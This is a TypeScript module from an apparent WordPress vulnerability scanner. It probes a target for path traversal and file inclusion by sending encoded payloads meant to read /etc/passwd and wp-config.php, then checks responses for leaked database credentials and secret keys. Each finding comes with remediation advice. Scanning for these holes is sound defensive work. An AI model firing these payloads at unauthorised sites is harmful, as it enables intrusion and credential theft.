import type { Finding, ModuleResult, ScanState } from '../types.js';
import { fetchURL, finding, moduleResult, normalizeTarget, parallelProbe } from '../utils.js';

const MODULE_NAME = 'Path Traversal Advanced';

// Reduced to 5 high-value payloads covering distinct bypass techniques
const TRAVERSAL_PAYLOADS: Array<[string, string]> = [
  ['..%252f..%252f..%252f..%252fetc%252fpasswd',           'root:'],   // double URL encode
  ['..%2F..%2F..%2F..%2Fetc%2Fpasswd',                    'root:'],   // single URL encode
  ['../../../etc/passwd%00',                               'root:'],   // null byte
  ['../../wp-config.php',                                  'DB_PASSWORD'], // wp-config direct
  ['php://filter/convert.base64-encode/resource=../wp-config.php', 'DB_'], // PHP stream wrapper
];

// Reduced to 7 most common LFI params (skip rarely-present plugin-specific params)
const PROBE_PARAMS: Array<[string, string]> = [
  ['/?file={payload}',                    'file_param'],
  ['/?template={payload}',                'template_param'],
  ['/?page={payload}',                    'page_param'],
  ['/?include={payload}',                 'include_param'],
  ['/?path={payload}',                    'path_param'],
  ['/?filename={payload}',                'filename_param'],
  ['/wp-json/wp/v2/media?file={payload}', 'rest_media_file'],
];

// Indicators of successful path traversal
const SUCCESS_INDICATORS = [
  { pattern: /root:[x*]:0:0/,            label: 'etc/passwd content' },
  { pattern: /DB_PASSWORD/,              label: 'wp-config.php content' },
  { pattern: /DB_HOST/,                  label: 'wp-config.php partial' },
  { pattern: /secret-key/i,              label: 'WP secret keys' },
  { pattern: /define\s*\(\s*['"]DB_/,    label: 'wp-config DB define' },
  { pattern: /bin\/bash/,                label: '/etc/passwd entry' },
  { pattern: /nobody:x:/,               label: '/etc/passwd content' },
  { pattern: /www-data:/,               label: '/etc/passwd www-data' },
  // Base64 encoded /etc/passwd
  { pattern: /cm9vdDp4OjA6MDo/,         label: 'base64 /etc/passwd' },
];

function detectSuccess(body: string): string | null {
  for (const { pattern, label } of SUCCESS_INDICATORS) {
    if (pattern.test(body)) return label;
  }
  return null;
}

export async function run(target: string, _state?: ScanState): Promise<ModuleResult> {
  const start = Date.now();
  target = normalizeTarget(target);
  const findings: Finding[] = [];
  const errors: string[] = [];

  try {
    const seen = new Set<string>();

    // Flatten param × payload combos
    const combos: Array<[string, string, string, string]> = [];
    for (const [paramTemplate, paramLabel] of PROBE_PARAMS) {
      for (const [payload, _indicator] of TRAVERSAL_PAYLOADS) {
        combos.push([paramTemplate, paramLabel, payload, _indicator]);
      }
    }

    await parallelProbe(combos, async ([paramTemplate, paramLabel, payload, _indicator]) => {
      if (seen.has(paramLabel)) return;

      const url = target + paramTemplate.replace('{payload}', payload);
      const res = await fetchURL(url, { timeoutMs: 3_000 });
      if (!res) return;

      const body = await res.text().catch(() => '');
      const successLabel = detectSuccess(body);

      if (successLabel && !seen.has(paramLabel)) {
        seen.add(paramLabel);
        findings.push(finding(
          'PATH_TRAVERSAL_SUCCESS',
          'CRITICAL',
          url,
          `Path traversal confirmed via '${paramLabel}' — file content leaked: ${successLabel}`,
          {
            evidence: `param="${paramLabel}" payload="${payload}" indicator="${successLabel}" body_excerpt="${body.slice(0, 200)}"`,
            remediation: 'Validate all file path inputs with realpath(). Ensure resolved path starts with allowed directory. Use basename() to strip directory components.',
          },
        ));
      }
    }, 35); // 7 params × 5 payloads = 35 combos; all fit in 1 batch at concurrency 35

    // REST API path traversal test
    const restTraversalPaths = [
      '/wp-json/wp/v2/media/../../wp-config',
      '/wp-json/wp/v2/posts/../../../../../../etc/passwd',
      '/wp-json/../../../etc/passwd',
    ];

    await parallelProbe(restTraversalPaths, async (path) => {
      const url = target + path;
      const res = await fetchURL(url, { timeoutMs: 4_000 });
      if (!res || res.status === 404) return;

      const body = await res.text().catch(() => '');
      const successLabel = detectSuccess(body);

      if (successLabel) {
        findings.push(finding(
          'PATH_TRAVERSAL_REST_API',
          'CRITICAL',
          url,
          `Path traversal via REST API URL path — content leaked: ${successLabel}`,
          {
            evidence: `path="${path}" indicator="${successLabel}"`,
            remediation: 'Use WordPress routing which normalizes paths. Ensure REST API route handlers do not construct file paths from URL segments.',
          },
        ));
      }
    }, 5);

    // Theme file inclusion test — common in themes that load templates dynamically
    const themeTemplateTests = [
      '/wp-content/themes/twentytwenty/?template=../../../../wp-config',
      '/?theme=default&template=../../../../etc/passwd',
      '/wp-content/themes/?load=../../wp-config.php',
    ];

    await parallelProbe(themeTemplateTests, async (path) => {
      const url = target + path;
      const res = await fetchURL(url, { timeoutMs: 4_000 });
      if (!res || res.status === 404) return;

      const body = await res.text().catch(() => '');
      const successLabel = detectSuccess(body);

      if (successLabel) {
        findings.push(finding(
          'PATH_TRAVERSAL_THEME',
          'CRITICAL',
          url,
          `Path traversal via theme template parameter — content leaked: ${successLabel}`,
          {
            evidence: `path="${path}" indicator="${successLabel}"`,
            remediation: 'Whitelist allowed template names. Never construct include paths from user input.',
          },
        ));
      }
    }, 5);
  } catch (e) {
    errors.push(String(e));
  }

  return moduleResult(MODULE_NAME, target, findings, errors, start);
}
